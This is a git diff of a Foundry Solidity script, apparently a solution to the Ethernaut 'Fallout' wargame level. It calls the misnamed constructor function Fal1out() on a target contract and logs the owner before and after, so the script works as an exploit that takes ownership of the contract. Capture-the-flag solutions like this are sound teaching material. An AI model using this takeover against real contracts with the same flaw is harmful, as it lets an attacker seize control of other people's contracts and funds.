@@ -7,17 +7,15 @@ import "forge-std/console.sol";
 
 contract FalloutSolution is Script {
 
-    Fallout public falloutInstance = Fallout(payable(0x9a157d9924b658F515F0D744De465987e1A8583C));
+    Fallout public falloutInstance = Fallout(0x17196B6d98a1CF2e43dee7bAd44B026dA7787258);
 
     function run() external {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
-        console.log("Current Owner is: ", falloutInstance.owner());
+        console.log("Owner before: ", falloutInstance.owner());
         falloutInstance.Fal1out();
-        console.log("New Owner is: ", falloutInstance.owner());
-
+        console.log("Owner after: ", falloutInstance.owner());
+        
         vm.stopBroadcast();
     }
-
 }
-
